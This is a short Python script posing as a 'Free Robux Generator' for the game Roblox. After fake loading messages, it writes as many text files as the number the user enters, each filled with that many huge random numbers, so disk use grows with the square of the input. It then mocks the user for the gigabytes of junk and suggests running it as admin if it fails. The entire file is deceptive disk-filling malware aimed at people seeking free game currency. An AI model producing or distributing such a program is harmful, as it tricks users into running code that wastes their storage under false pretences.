from time import sleep
from random import randint as rint
def generate_robux():
    generated = 0
    chars = 0
    loadtime = rint(2,5)
    print("Welcome to Free Robux Generator!")
    robux = int(input("How many Robux would you like to print?\n\nNumber: "))
    print("Initailizing...")
    sleep(loadtime)
    print("Generating Robux...")
    sleep(1)
    generated = 0
    for generated in range(robux):
        generated += 1
        with open(f"Robux-Gift-Key ({generated}).txt", 'w') as file:
            print(generated, "of", robux, "generated.")
            for i in range(robux):
                giftkey = rint(robux*10000000000000000000000000000000000000000000000000000000000000, robux*100000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
                chars += len(list(str(giftkey)))
                file.write(f'{str(giftkey)}\n')
    sizebytes = chars
    sizegigabytes = sizebytes/1073741824
    print(f"\nEnjoy deleting the {generated} .txt files that take up {round(sizegigabytes,2)} gigabytes of memory! >:)")
    sleep(999)
try:
    generate_robux()
except Exception as e:
    print("\nError:")
    print(e)
    print("\n\nPossible solutions:\n\nRun the program as admin.")
    sleep(999)